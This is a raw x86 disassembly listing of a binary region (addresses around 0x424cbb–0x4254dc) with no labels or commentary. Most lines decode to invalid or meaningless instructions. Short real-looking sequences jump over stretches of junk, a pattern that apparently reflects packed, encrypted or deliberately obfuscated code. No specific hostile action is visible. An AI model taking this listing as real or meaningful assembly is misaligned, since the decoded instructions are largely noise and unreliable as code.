  424cbb:	push   esp
  424cbc:	sub    ecx,esi
  424cbe:	popa   
  424cbf:	ss clc 
  424cc1:	jecxz  0x424c97
  424cc3:	xchg   ebx,eax
  424cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cc5:	cli    
  424cc6:	sbb    ebp,DWORD PTR [ebx+0x6511dd05]
  424ccc:	in     al,0x46
  424cce:	out    0x9a,eax
  424cd0:	xchg   eax,ecx
  424cd2:	in     al,dx
  424cd3:	pop    esp
  424cd4:	adc    eax,0xdf80d5aa
  424cd9:	jae    0x424cab
  424cdb:	sti    
  424cdc:	in     eax,0x2a
  424cde:	cmp    eax,0xe171409a
  424ce3:	(bad)  
  424ce4:	and    ecx,DWORD PTR [ebx+edx*2-0x40]
  424ce8:	or     eax,0x4bc6bff0
  424ced:	mov    bl,0x27
  424cef:	stos   DWORD PTR es:[edi],eax
  424cf0:	mov    DWORD PTR [edx-0x5f],ebp
  424cf3:	jbe    0x424ce8
  424cf5:	loop   0x424cee
  424cf7:	fbld   TBYTE PTR [ecx]
  424cf9:	inc    eax
  424cfa:	adc    al,0x74
  424cfc:	and    edx,0x187e0445
  424d02:	jl     0x424c96
  424d04:	cs cdq 
  424d06:	xchg   esp,eax
  424d07:	pusha  
  424d08:	add    eax,0xf713b9af
  424d0d:	mov    al,0xa0
  424d0f:	xchg   esi,eax
  424d10:	iret   
  424d11:	in     eax,dx
  424d12:	call   0x93f4:0x97f6fc5e
  424d19:	shl    ch,0x95
  424d1c:	mov    dl,0x46
  424d1e:	mov    ecx,DWORD PTR [ebp-0x18]
  424d21:	jmp    0x424de6
  424d26:	cwde   
  424d27:	add    bh,BYTE PTR [ecx]
  424d29:	cmp    DWORD PTR [ebx+0x551bb8bb],0xb35f3dc4
  424d33:	in     eax,0xc8
  424d35:	addr16 cmp al,0xb2
  424d38:	add    DWORD PTR [eax],eax
  424d3a:	test   al,0x0
  424d3c:	add    BYTE PTR [eax],al
  424d3e:	ja     0x424d4e
  424d40:	mov    esi,0xe4a2246c
  424d45:	das    
  424d46:	jbe    0x424d55
  424d48:	gs jle 0x424d25
  424d4b:	rcl    ebp,0xf4
  424d4e:	xlat   BYTE PTR ds:[ebx]
  424d4f:	sbb    ah,BYTE PTR [ecx]
  424d51:	xor    DWORD PTR [eax+ebx*8+0x17],esp
  424d55:	addr16 jo 0x424cdf
  424d58:	repz adc al,0xe5
  424d5b:	fidiv  DWORD PTR [ecx-0x5ffe8f6d]
  424d61:	dec    ebx
  424d62:	lods   eax,DWORD PTR ds:[esi]
  424d63:	repz jno 0x424da3
  424d66:	mov    ds:0xff682a75,al
  424d6b:	lods   al,BYTE PTR ds:[esi]
  424d6c:	add    ch,BYTE PTR [esi]
  424d6e:	jmp    0x424d36
  424d70:	iret   
  424d71:	cdq    
  424d72:	jae    0x424d13
  424d74:	xlat   BYTE PTR ds:[ebx]
  424d75:	cmp    al,BYTE PTR [ecx+0x65]
  424d78:	or     al,0x8c
  424d7a:	clc    
  424d7b:	xor    eax,0x2c4db88e
  424d80:	sub    esi,DWORD PTR ds:0xf28cff9d
  424d86:	jp     0x424e04
  424d88:	cmp    DWORD PTR [ebp-0x19],0x49848c99
  424d8f:	xor    BYTE PTR [eax-0x24431309],dh
  424d95:	push   es
  424d96:	add    BYTE PTR [ebx+esi*4],al
  424d99:	je     0x424e0d
  424d9b:	data16 shr BYTE PTR [ebp-0x6a],0x61
  424da0:	lods   al,BYTE PTR ds:[esi]
  424da1:	mov    ecx,DWORD PTR [ebx]
  424da3:	xchg   esi,eax
  424da4:	cmp    BYTE PTR [eax],ah
  424da6:	sbb    DWORD PTR [ecx],0xffffffb6
  424da9:	les    esi,FWORD PTR [ecx+0x4ea65770]
  424daf:	(bad)  
  424db0:	(bad)  
  424db1:	adc    bl,bh
  424db3:	dec    edi
  424db4:	arpl   WORD PTR [ebx+0x2e],bp
  424db7:	adc    BYTE PTR [esi+ebx*2],dl
  424dba:	mov    ch,bl
  424dbc:	(bad)  
  424dbd:	into   
  424dbe:	sub    eax,ecx
  424dc0:	mov    edx,0x162a80af
  424dc5:	enter  0xc28e,0xcf
  424dc9:	aaa    
  424dca:	(bad)  
  424dcb:	adc    al,0x78
  424dcd:	pop    ecx
  424dce:	lock jnp 0x424db5
  424dd1:	enter  0x89f9,0x79
  424dd5:	int    0xaa
  424dd7:	xchg   esp,eax
  424dd8:	(bad)  
  424dd9:	int3   
  424dda:	daa    
  424ddb:	adc    DWORD PTR [eax-0x32c774c8],ebx
  424de1:	mov    eax,0x80b6246
  424de6:	mov    eax,DWORD PTR [ebp-0x1c]
  424de9:	or     ecx,0xfffff284
  424def:	sub    ecx,eax
  424df1:	mov    eax,DWORD PTR [ebp-0x4]
  424df4:	jmp    0x424eb9
  424df9:	daa    
  424dfa:	repz adc dl,0xd4
  424dfe:	repz ja 0x424df8
  424e01:	and    DWORD PTR [esi+0x455a67fb],0x2e
  424e08:	cmp    ah,ah
  424e0a:	mov    dl,0x1
  424e0c:	add    BYTE PTR [eax-0x38000000],ch
  424e12:	push   esi
  424e13:	add    BYTE PTR ds:0xbd4e94b6,0x84
  424e1a:	sbb    eax,0x6b63611e
  424e1f:	int    0x3d
  424e21:	jae    0x424e7d
  424e23:	push   ds
  424e24:	sbb    eax,0x73156216
  424e29:	lahf   
  424e2a:	jnp    0x424def
  424e2c:	fucomp st(4)
  424e2e:	imul   ebp,DWORD PTR [edi],0xffffffd4
  424e31:	repnz push ebx
  424e33:	ror    bh,0x59
  424e36:	inc    esi
  424e37:	out    0xa6,al
  424e39:	mov    edi,0xe968c850
  424e3e:	in     eax,dx
  424e3f:	cmp    al,0x56
  424e41:	sbb    eax,DWORD PTR [edi]
  424e43:	jp     0x424df4
  424e45:	(bad)  
  424e46:	jle    0x424dd4
  424e48:	clc    
  424e49:	xor    ch,BYTE PTR [ebp-0x1b]
  424e4c:	lods   al,BYTE PTR ds:[esi]
  424e4d:	push   edi
  424e4e:	fistp  QWORD PTR [ebp+eax*1-0x1e]
  424e52:	pop    eax
  424e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e54:	push   eax
  424e55:	mov    eax,ds:0x855ab596
  424e5a:	inc    ecx
  424e5b:	pop    esi
  424e5c:	mov    eax,ds:0x3c88bb6c
  424e61:	push   DWORD PTR [edi+0x23]
  424e64:	mov    ebp,0x7115ecc0
  424e69:	pop    ebp
  424e6a:	add    esp,DWORD PTR [ecx-0x3fc5bd7b]
  424e70:	push   cs
  424e71:	inc    ebx
  424e72:	or     eax,0x13861dc3
  424e77:	das    
  424e78:	fistp  WORD PTR [edi]
  424e7a:	mov    WORD PTR [edi],cs
  424e7c:	std    
  424e7d:	imul   esp,esi,0x6634f90f
  424e83:	adc    eax,0xbfddebd
  424e88:	xor    ebx,DWORD PTR [eax]
  424e8a:	imul   esi,ebx,0xffffff91
  424e8d:	mov    esp,0xc108d1b9
  424e92:	xchg   DWORD PTR [edi+0x54d2e3e3],ecx
  424e98:	push   esi
  424e99:	out    dx,eax
  424e9a:	(bad)  
  424e9b:	stos   DWORD PTR es:[edi],eax
  424e9c:	and    DWORD PTR [eax],0x70778cb6
  424ea2:	xlat   BYTE PTR ds:[ebx]
  424ea3:	push   ds
  424ea4:	stc    
  424ea5:	xchg   edi,eax
  424ea6:	enter  0xe3c2,0xf2
  424eaa:	jbe    0x424e65
  424eac:	add    bh,bh
  424eae:	or     BYTE PTR [edi+0x26f8e8d0],cl
  424eb4:	out    0xce,al
  424eb6:	push   ebp
  424eb7:	mov    DWORD PTR [eax+0x69f8558b],esi
  424ebd:	ror    BYTE PTR [ebx-0x74ffffc7],0x75
  424ec4:	hlt    
  424ec5:	sub    eax,edx
  424ec7:	add    eax,0x721e
  424ecc:	jmp    0x424f91
  424ed1:	xchg   ebp,eax
  424ed2:	push   es
  424ed3:	fbstp  TBYTE PTR [ebx+0x26fdfbdf]
  424ed9:	inc    esi
  424eda:	in     eax,0xc4
  424edc:	je     0x424f22
  424ede:	sub    DWORD PTR [edx+0x70],ebp
  424ee1:	mov    WORD PTR [ebx+0xa80001],?
  424ee7:	add    BYTE PTR [eax],al
  424ee9:	adc    BYTE PTR [eax-0x41735a5a],cl
  424eef:	jl     0x424e7a
  424ef1:	jne    0x424f6c
  424ef3:	retf   0x3d1a
  424ef6:	and    DWORD PTR [ebp+0x7610724a],esi
  424efc:	jmp    0xaedfeb6f
  424f01:	and    eax,0x91693fe5
  424f06:	sbb    al,BYTE PTR [ebp+0x3e1ea528]
  424f0c:	push   esi
  424f0d:	mov    fs,WORD PTR [esi+esi*8+0x13]
  424f11:	fldcw  WORD PTR [ecx]
  424f13:	xor    al,0x9f
  424f15:	jno    0x424f6d
  424f17:	push   esi
  424f18:	fnstcw WORD PTR [esi-0x17fa0a02]
  424f1e:	inc    ebx
  424f1f:	mov    ss,WORD PTR [esi+0x458a0e3d]
  424f25:	lock icebp 
  424f27:	push   edi
  424f28:	fmul   QWORD PTR [ebx-0xeb28d31]
  424f2e:	(bad)  
  424f2f:	jae    0x424f1e
  424f31:	mov    DWORD PTR [edi-0x2de05c88],esi
  424f37:	mov    dh,0xb
  424f39:	push   0xc001b39
  424f3e:	pop    ss
  424f3f:	outs   dx,DWORD PTR ds:[esi]
  424f40:	out    dx,al
  424f41:	jmp    0x424f25
  424f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f44:	ss call 0xbc3d62d0
  424f4a:	mov    edi,fs
  424f4c:	sbb    BYTE PTR [ebp-0x634a928b],ch
  424f52:	or     BYTE PTR [esi+0xb],ah
  424f55:	add    ah,0x4f
  424f58:	stos   BYTE PTR es:[edi],al
  424f59:	sbb    edx,DWORD PTR [ecx+0x49117686]
  424f5f:	pop    es
  424f60:	xor    DWORD PTR [edx-0x30],ebx
  424f63:	xor    al,0x2b
  424f65:	dec    ecx
  424f66:	sub    esp,DWORD PTR [edi-0x4274924f]
  424f6c:	jl     0x424f2f
  424f6e:	hlt    
  424f6f:	into   
  424f70:	out    dx,eax
  424f71:	adc    eax,0xfc943917
  424f76:	inc    edi
  424f77:	or     esi,ecx
  424f79:	and    edi,DWORD PTR [ebx+0x54]
  424f7c:	jb     0x424fb3
  424f7e:	push   0x8d0c08ca
  424f83:	dec    ecx
  424f84:	sub    DWORD PTR [ebx-0x423a398],0xc5fa48e
  424f8e:	add    DWORD PTR [ebp-0x69],edx
  424f91:	xor    edx,edx
  424f93:	div    esi
  424f95:	and    ecx,0x4210
  424f9b:	mov    edx,0x5a11
  424fa0:	jmp    0x425065
  424fa5:	dec    eax
  424fa6:	ret    
  424fa7:	dec    edx
  424fa8:	xchg   ebx,eax
  424fa9:	retf   
  424faa:	(bad)  
  424fad:	push   cs
  424fae:	sub    ah,ch
  424fb0:	cmp    DWORD PTR [esi-0x33],ebx
  424fb3:	cld    
  424fb4:	jp     0x424fea
  424fb6:	mov    ah,0x1
  424fb8:	add    BYTE PTR [eax+0x60000000],ch
  424fbe:	loope  0x424ffb
  424fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fc1:	ins    DWORD PTR es:[edi],dx
  424fc2:	loop   0x424f55
  424fc4:	and    al,0x20
  424fc6:	stos   DWORD PTR es:[edi],eax
  424fc7:	inc    esi
  424fc8:	xor    edx,DWORD PTR [eax+ebp*2+0x11d09cb0]
  424fcf:	adc    al,0xc2
  424fd1:	imul   edi,DWORD PTR [ebx],0xffffffce
  424fd4:	mov    ch,0x71
  424fd6:	shl    ch,0xf3
  424fd9:	cmp    edx,DWORD PTR [esi-0x4fc51dae]
  424fdf:	add    BYTE PTR [eax+0x64],dh
  424fe2:	xor    ebp,DWORD PTR [ebp+eiz*8-0x27]
  424fe6:	jmp    edi
  424fe8:	sub    bl,cl
  424fea:	aas    
  424feb:	es inc eax
  424fed:	jae    0x42504b
  424fef:	leave  
  424ff0:	pop    es
  424ff1:	ss jge 0x425041
  424ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ff5:	and    al,0x63
  424ff7:	xchg   ebp,eax
  424ff8:	jbe    0x425050
  424ffa:	pop    esp
  424ffb:	mov    al,0xc
  424ffd:	xlat   BYTE PTR ds:[ebx]
  424ffe:	loopne 0x425070
  425000:	scas   al,BYTE PTR es:[edi]
  425001:	jecxz  0x424fb8
  425003:	inc    esi
  425004:	mov    fs,WORD PTR [ebp-0x79]
  425007:	mov    DWORD PTR [esi],ecx
  425009:	adc    BYTE PTR [esi+edi*1-0xf],al
  42500d:	repz inc esp
  42500f:	inc    edx
  425010:	jle    0x425029
  425012:	lods   al,BYTE PTR ds:[esi]
  425013:	and    ecx,DWORD PTR [ecx]
  425015:	xchg   DWORD PTR [edx+0x1d9b1f2d],ebx
  42501b:	lock mov edi,DWORD PTR cs:[ecx-0x7a]
  425020:	jno    0x424fe5
  425022:	repnz cmc 
  425024:	mov    edi,0xbc421c3f
  425029:	jl     0x425027
  42502b:	rcl    BYTE PTR [ecx+edi*4+0x7b],0xc4
  425030:	or     BYTE PTR [eax-0x7b],ah
  425033:	mov    ecx,?
  425035:	ins    BYTE PTR es:[edi],dx
  425036:	mov    esp,0xcf70a007
  42503b:	fcmovnbe st,st(6)
  42503d:	mov    WORD PTR [esi-0x63],ds
  425040:	jns    0x4250b3
  425042:	cwde   
  425043:	ds xchg edi,eax
  425045:	lods   eax,DWORD PTR ds:[esi]
  425046:	ror    DWORD PTR [esi+0xe7a0add],cl
  42504c:	lods   al,BYTE PTR ds:[esi]
  42504d:	jno    0x425001
  42504f:	mov    bh,0x9f
  425051:	dec    esi
  425052:	cmp    dh,BYTE PTR [eax-0x40]
  425055:	lahf   
  425056:	inc    esi
  425057:	mov    bl,0x8a
  425059:	pop    esp
  42505a:	xchg   esp,eax
  42505b:	dec    ebp
  42505c:	push   esi
  42505d:	and    DWORD PTR [esi+0x6ad2f2fa],eax
  425063:	push   cs
  425064:	fild   DWORD PTR [ecx+0x3103c9]
  42506a:	add    BYTE PTR [ecx+0x1919f1],al
  425070:	add    BYTE PTR [edi+0x1d2f],bh
  425076:	sub    edx,eax
  425078:	mov    eax,DWORD PTR [ebp-0x10]
  42507b:	mov    esi,DWORD PTR [ebp-0x14]
  42507e:	or     eax,0x6090
  425083:	xor    eax,esi
  425085:	mov    esi,0x5525
  42508a:	jmp    0x425b34
  42508f:	jmp    0x425154
  425094:	cmp    eax,0xfb3d698f
  425099:	(bad)  
  42509a:	jge    0x42502b
  42509c:	into   
  42509d:	jge    0x4250a7
  42509f:	mov    ebx,0xdecd795f
  4250a4:	fdiv   QWORD PTR [ecx+eax*1+0xa800]
  4250ab:	add    BYTE PTR [ebp-0x4a84cef9],bl
  4250b1:	sar    DWORD PTR [ecx+esi*2],1
  4250b4:	(bad)  
  4250b5:	jbe    0x42511e
  4250b7:	or     eax,0x6e524103
  4250bc:	cmp    edi,DWORD PTR [edx+0x932f01a]
  4250c2:	xchg   ebp,eax
  4250c3:	cwde   
  4250c4:	(bad)  
  4250c5:	(bad)  
  4250c7:	adc    DWORD PTR [ebx-0x5b],0x470a7d07
  4250ce:	cdq    
  4250cf:	aas    
  4250d0:	inc    ecx
  4250d1:	je     0x425075
  4250d3:	xor    eax,0xd45fa939
  4250d8:	out    dx,eax
  4250d9:	lods   eax,DWORD PTR ds:[esi]
  4250da:	out    0xab,al
  4250dc:	call   0xcd528d7c
  4250e1:	jbe    0x4250ca
  4250e3:	push   es
  4250e4:	out    0x42,eax
  4250e6:	xlat   BYTE PTR ds:[ebx]
  4250e7:	and    BYTE PTR [ecx+0x443406a5],dh
  4250ed:	inc    ebp
  4250ee:	cli    
  4250ef:	dec    esp
  4250f0:	dec    esi
  4250f1:	dec    ecx
  4250f2:	test   DWORD PTR [ebx-0x78],esp
  4250f5:	pop    edi
  4250f6:	and    al,0xd1
  4250f8:	test   DWORD PTR [ebx],0x846fe4ed
  4250fe:	ret    
  4250ff:	lahf   
  425100:	sbb    al,BYTE PTR [edi+ebx*4]
  425103:	cmc    
  425104:	out    0x67,eax
  425106:	sbb    DWORD PTR [esi+eiz*4],0xa
  42510a:	loope  0x425156
  42510c:	ret    
  42510d:	push   ss
  42510e:	cmp    DWORD PTR [esi+0x4cfcb803],eax
  425114:	rol    BYTE PTR [ecx-0x7608f750],1
  42511a:	jge    0x425182
  42511c:	sub    al,0x27
  42511e:	ins    BYTE PTR es:[edi],dx
  42511f:	aam    0x76
  425121:	adc    ebx,DWORD PTR [esi+0x7893e502]
  425127:	xchg   edx,eax
  425128:	data16 cld 
  42512a:	lods   al,BYTE PTR ds:[esi]
  42512b:	xchg   esi,eax
  42512c:	cwde   
  42512d:	daa    
  42512e:	mov    ebp,0x6355765f
  425133:	mov    al,0x7c
  425135:	jg     0x4250f1
  425137:	mov    esp,0xe6c87829
  42513c:	cmp    ebp,eax
  42513e:	mov    esi,0xe75a2ba9
  425143:	cmp    ebp,DWORD PTR [ecx]
  425145:	shl    esp,cl
  425147:	pop    ebx
  425148:	aad    0x8d
  42514a:	call   DWORD PTR [ecx]
  42514c:	ficom  WORD PTR [edx]
  42514e:	ds pop edx
  425150:	push   0xffffffa4
  425152:	fwait
  425153:	mov    ch,0xc7
  425155:	inc    ebp
  425156:	loopne 0x425145
  425158:	inc    ebx
  425159:	add    BYTE PTR [eax],al
  42515b:	mov    DWORD PTR [ebp-0x18],0x22e8
  425162:	mov    DWORD PTR [ebp-0x1c],0x28e0
  425169:	mov    eax,DWORD PTR [ebp-0x1c]
  42516c:	mov    edx,DWORD PTR [ebp-0x18]
  42516f:	sub    eax,0xdf5
  425174:	or     eax,edx
  425176:	jmp    0x42523b
  42517b:	jo     0x425148
  42517d:	mov    eax,ds:0x7beabbaa
  425182:	fild   DWORD PTR [eax-0x6d]
  425185:	adc    esp,esp
  425187:	or     cl,BYTE PTR gs:[ecx]
  42518a:	xchg   edx,eax
  42518b:	test   BYTE PTR [ebp+0xa80001],dh
  425191:	add    BYTE PTR [eax],al
  425193:	pop    ecx
  425194:	xchg   edi,eax
  425195:	scas   al,BYTE PTR es:[edi]
  425196:	add    BYTE PTR ds:0xd0d04367,cl
  42519c:	pop    esp
  42519d:	call   0xb0dc5ae0
  4251a2:	xor    ah,BYTE PTR [edi-0x4f7dbc2]
  4251a8:	fmul   QWORD PTR es:[ebx]
  4251ab:	cmp    edi,DWORD PTR [eax+0x62e686af]
  4251b1:	sub    ecx,ecx
  4251b3:	add    al,0xaa
  4251b5:	stos   BYTE PTR es:[edi],al
  4251b6:	fdiv   DWORD PTR [ebp-0x60]
  4251b9:	jo     0x4251db
  4251bb:	mov    ebx,0xdbd6e0cf
  4251c0:	jmp    0x1c20:0x4bcf4733
  4251c7:	mov    esp,DWORD PTR [edi+0x3faac21c]
  4251cd:	push   0xd20c3533
  4251d2:	cmp    DWORD PTR [eax+0x11436f69],edi
  4251d8:	sub    eax,edi
  4251da:	stos   BYTE PTR es:[edi],al
  4251db:	test   DWORD PTR [eax-0x6],edi
  4251de:	jae    0x42523b
  4251e0:	and    ch,BYTE PTR [eax]
  4251e2:	dec    ecx
  4251e3:	es aas 
  4251e5:	pop    esp
  4251e6:	jo     0x425193
  4251e8:	sar    bh,cl
  4251ea:	mov    ah,0x87
  4251ec:	mov    WORD PTR [ebp*8+0x7722d2f],fs
  4251f3:	sbb    eax,0x932cac44
  4251f8:	outs   dx,BYTE PTR ds:[esi]
  4251f9:	jno    0x4251bd
  4251fb:	push   ebx
  4251fc:	sub    esp,eax
  4251fe:	mov    eax,ds:0xed2aa6b5
  425203:	pop    es
  425204:	std    
  425205:	(bad)  
  425206:	xor    ecx,edi
  425208:	sar    dl,cl
  42520a:	lock sub al,0x52
  42520d:	not    DWORD PTR [di+0x1a39]
  425212:	dec    ebx
  425213:	sub    al,0xb2
  425215:	scas   al,BYTE PTR es:[edi]
  425216:	dec    ebp
  425217:	rol    ebp,cl
  425219:	(bad)  
  42521a:	jo     0x4251bc
  42521c:	sbb    eax,0x1670f9b2
  425221:	push   ds
  425222:	fldcw  WORD PTR [edx+0x3]
  425225:	cmp    BYTE PTR [eax+0x1d],ch
  425228:	aaa    
  425229:	fcomp  DWORD PTR [edi]
  42522b:	in     eax,dx
  42522c:	iret   
  42522d:	packuswb mm5,QWORD PTR [ebp+0x17]
  425231:	or     ah,BYTE PTR [ecx+edi*8-0x293518f8]
  425238:	addr16 pop esi
  42523a:	sahf   
  42523b:	mov    edx,DWORD PTR [ebp-0x20]
  42523e:	xor    eax,edx
  425240:	jmp    0x425305
  425245:	nop
  425246:	sub    ecx,DWORD PTR [ecx+eax*4+0x3b9da7bf]
  42524d:	lods   al,BYTE PTR ds:[esi]
  42524e:	fwait
  42524f:	dec    edi
  425250:	fisub  WORD PTR [ebx+0x2c699d6a]
  425256:	mov    dh,0x1
  425258:	add    BYTE PTR [eax-0x21000000],ch
  42525e:	cdq    
  42525f:	pop    es
  425260:	or     edx,DWORD PTR [eax]
  425262:	rol    dh,0xa0
  425265:	loop   0x4252a3
  425267:	mov    dx,0xeecd
  42526b:	push   0xb0086186
  425270:	cwde   
  425271:	ins    BYTE PTR es:[edi],dx
  425272:	pop    ecx
  425273:	or     bl,0x1c
  425276:	xor    eax,0x91ef58f
  42527b:	cmp    ecx,DWORD PTR [eax-0x4f]
  42527e:	push   edx
  42527f:	dec    esp
  425280:	dec    ebp
  425281:	and    DWORD PTR [edi],eax
  425283:	inc    ecx
  425284:	dec    ecx
  425285:	mov    BYTE PTR [ecx],0x83
  425288:	test   BYTE PTR [eax-0x63],dl
  42528b:	dec    edx
  42528c:	add    DWORD PTR [edi-0x1bf47838],ebx
  425292:	int3   
  425293:	mov    al,ds:0x714553c2
  425298:	aad    0xd2
  42529a:	arpl   WORD PTR [ebp+0xfc9f27b],sp
  4252a0:	test   BYTE PTR [ebp-0x60],dh
  4252a3:	inc    ecx
  4252a4:	push   ss
  4252a5:	je     0x4252b7
  4252a7:	jb     0x425272
  4252a9:	inc    esi
  4252aa:	cmp    dl,bh
  4252ac:	fistp  DWORD PTR [esi+0x20fb6a25]
  4252b2:	jp     0x425323
  4252b4:	fdivr  QWORD PTR [eax-0x3c1d15a]
  4252ba:	jno    0x4252a1
  4252bc:	cdq    
  4252bd:	pop    ecx
  4252be:	push   ss
  4252bf:	and    esp,ebp
  4252c1:	enter  0x7ab8,0x62
  4252c5:	arpl   WORD PTR [edi-0x42],cx
  4252c8:	bsr    ebp,DWORD PTR [ebp+0x11934040]
  4252cf:	push   ss
  4252d0:	mov    dl,BYTE PTR [edx-0x3f]
  4252d3:	jo     0x425326
  4252d5:	jg     0x425287
  4252d7:	sti    
  4252d8:	dec    edx
  4252d9:	call   0xc72f:0x19f0b1dd
  4252e0:	jb     0x42529d
  4252e2:	or     BYTE PTR [edi-0x30],ch
  4252e5:	sahf   
  4252e6:	std    
  4252e7:	push   0xffffff82
  4252e9:	pushf  
  4252ea:	fcom   DWORD PTR ds:0x78f11a6e
  4252f0:	(bad)  [edx-0x29db6b12]
  4252f6:	pop    ebp
  4252f7:	jo     0x425352
  4252f9:	xchg   edi,eax
  4252fa:	mov    eax,0x7adc20c4
  4252ff:	mov    bh,0x41
  425301:	aas    
  425302:	xchg   edi,eax
  425303:	push   eax
  425304:	sbb    ecx,DWORD PTR [ebx-0x7e2fd42f]
  42530a:	ret    0x50ec
  42530d:	add    BYTE PTR [eax],al
  42530f:	mov    DWORD PTR [ebp-0x20],edx
  425312:	mov    eax,DWORD PTR [ebp-0x24]
  425315:	mov    ebx,DWORD PTR [ebp-0x28]
  425318:	imul   eax,eax,0x376c
  42531e:	jmp    0x4253e3
  425323:	test   BYTE PTR ds:0x7a8f7a07,cl
  425329:	std    
  42532a:	(bad)  
  42532b:	fstp   TBYTE PTR [edx+edi*4]
  42532e:	ret    
  42532f:	mov    ah,0xed
  425331:	mov    al,ds:0x1b6d49f
  425336:	add    BYTE PTR [eax+0x10000000],ch
  42533c:	xor    DWORD PTR [edi-0xa4a1298],ebp
  425342:	ror    DWORD PTR [esi],1
  425344:	xor    eax,0xa0b7356a
  425349:	mov    bl,ch
  42534b:	cmp    eax,0xcb01b6fd
  425350:	mov    cl,0x2a
  425352:	loope  0x4252d6
  425354:	in     eax,0x1b
  425356:	cmp    BYTE PTR [eax-0x2b251212],0x10
  42535d:	add    ch,dl
  42535f:	xor    DWORD PTR [edx],eax
  425361:	popf   
  425362:	jo     0x425362
  425364:	xchg   edi,eax
  425365:	addr16 (bad) 
  425367:	popa   
  425368:	into   
  425369:	fld    TBYTE PTR es:[ecx+0x784107b4]
  425370:	mov    al,0x4f
  425372:	and    edi,DWORD PTR [edx]
  425374:	sahf   
  425375:	pop    ecx
  425376:	or     edx,DWORD PTR [edi-0x44487bff]
  42537c:	push   edi
  42537d:	mov    ecx,0xcb8d8c5f
  425382:	sub    dh,al
  425384:	pop    ebp
  425385:	or     DWORD PTR ds:0xfba576a2,esp
  42538b:	lods   al,BYTE PTR ds:[esi]
  42538c:	sahf   
  42538d:	js     0x4253a3
  42538f:	out    0x34,eax
  425391:	sbb    edx,DWORD PTR [edx+0x61ab5d96]
  425397:	(bad)  
  425398:	fidiv  DWORD PTR [ebx+edx*4]
  42539b:	mov    ds:0xe1905c29,al
  4253a0:	daa    
  4253a1:	icebp  
  4253a2:	xor    eax,0xc4a9c11f
  4253a7:	sub    ah,BYTE PTR [ecx+0xbac2ba5]
  4253ad:	and    ch,al
  4253af:	vpcmpgtb xmm0,xmm4,XMMWORD PTR [ebp-0x60]
  4253b4:	aam    0xaa
  4253b6:	or     eax,DWORD PTR [ecx-0x4e982c12]
  4253bc:	adc    dl,BYTE PTR [edx-0x1a]
  4253bf:	and    DWORD PTR ds:0xba70f814,0x1f5e9a04
  4253c9:	pop    ds
  4253ca:	retf   0xd289
  4253cd:	sub    bh,dl
  4253cf:	in     eax,0x85
  4253d1:	or     esp,edx
  4253d3:	nop
  4253d4:	xchg   ecx,eax
  4253d5:	xor    BYTE PTR [eax+0x70],0x18
  4253d9:	dec    edi
  4253da:	or     ah,BYTE PTR [edi-0x6d]
  4253dd:	cdq    
  4253de:	sbb    DWORD PTR [eax],eax
  4253e0:	xchg   esp,eax
  4253e1:	sub    eax,0xf7d23375
  4253e6:	repz jmp 0x4254ac
  4253ec:	pop    edx
  4253ed:	aam    0xa7
  4253ef:	and    ch,BYTE PTR [edi+0x32fcdf73]
  4253f5:	loopne 0x4253bc
  4253f7:	les    ebp,FWORD PTR [edx]
  4253f9:	adc    DWORD PTR [eax+0x69],esi
  4253fc:	jl     0x4253b5
  4253fe:	add    DWORD PTR [eax],eax
  425400:	test   al,0x0
  425402:	add    BYTE PTR [eax],al
  425404:	and    DWORD PTR [ebp+0x71db55b8],ecx
  42540a:	cdq    
  42540b:	cmp    edx,edx
  42540d:	jecxz  0x425479
  42540f:	cmp    bh,BYTE PTR [ebp+edi*8+0x27]
  425413:	mov    al,ds:0xe594f6c2
  425418:	outs   dx,DWORD PTR ds:[esi]
  425419:	rol    DWORD PTR [edi],cl
  42541b:	enter  0x256c,0xc3
  42541f:	jo     0x425497
  425421:	pop    esi
  425422:	dec    edi
  425423:	cmc    
  425424:	daa    
  425425:	dec    esi
  425426:	repz sbb eax,0x9beec083
  42542c:	inc    ebx
  42542d:	adc    esi,eax
  42542f:	inc    esi
  425430:	ret    
  425431:	cmp    edi,DWORD PTR [ecx-0x18]
  425434:	xor    dl,BYTE PTR [ebp-0x74]
  425437:	mov    esi,0x43399531
  42543c:	adc    bh,BYTE PTR [edi-0x79]
  42543f:	pop    es
  425440:	or     al,0xe
  425442:	mov    edx,0xd5681e0e
  425447:	push   eax
  425448:	adc    bh,dh
  42544a:	sub    esi,DWORD PTR [esi-0xbf05322]
  425450:	out    dx,eax
  425451:	pop    ds
  425452:	jnp    0x425458
  425454:	mov    dh,BYTE PTR [eax+0x408d2031]
  42545a:	push   edx
  42545b:	mov    ch,0x89
  42545d:	das    
  42545e:	mov    DWORD PTR [ebp-0x21322456],edi
  425464:	push   0xffffffe7
  425466:	or     eax,0xdd71129e
  42546b:	cdq    
  42546c:	retf   0x9af7
  42546f:	xchg   ebp,eax
  425470:	xor    al,0x17
  425472:	cmp    eax,0xde4d98ae
  425477:	push   ebp
  425478:	adc    cl,dl
  42547a:	gs mov ebx,0xc740c106
  425480:	pushf  
  425481:	sahf   
  425482:	mov    eax,0x2e897512
  425487:	push   ebx
  425488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425489:	inc    esi
  42548a:	std    
  42548b:	js     0x425440
  42548d:	push   ebx
  42548e:	cmp    ch,BYTE PTR [ecx]
  425490:	sub    ch,al
  425492:	pop    esi
  425493:	mov    eax,0x62fff76f
  425498:	loopne 0x4254fc
  42549a:	cmp    BYTE PTR [ebx+0x23e76132],bh
  4254a0:	pop    cx
  4254a2:	ror    DWORD PTR [esi-0x73],cl
  4254a5:	push   ebx
  4254a6:	es aam 0x64
  4254a9:	xor    al,0xcb
  4254ab:	retf   
  4254ac:	mov    edx,DWORD PTR [ebp-0x2c]
  4254af:	jmp    0x425574
  4254b4:	xchg   DWORD PTR ds:0x649f641d,ebx
  4254ba:	(bad)  
  4254bb:	push   DWORD PTR [edx]
  4254bd:	aam    0xb8
  4254bf:	lahf   
  4254c0:	xchg   edi,eax
  4254c1:	sbb    ebp,DWORD PTR [ecx-0x3d]
  4254c4:	and    al,0xb8
  4254c6:	add    DWORD PTR [eax],eax
  4254c8:	test   al,0x0
  4254ca:	add    BYTE PTR [eax],al
  4254cc:	add    al,BYTE PTR [ebx+ebx*2-0x3251a017]
  4254d3:	fwait
  4254d4:	int    0x9a
  4254d6:	jmp    0xa237f400
  4254db:	push   cs
  4254dc:	xor    al,bh
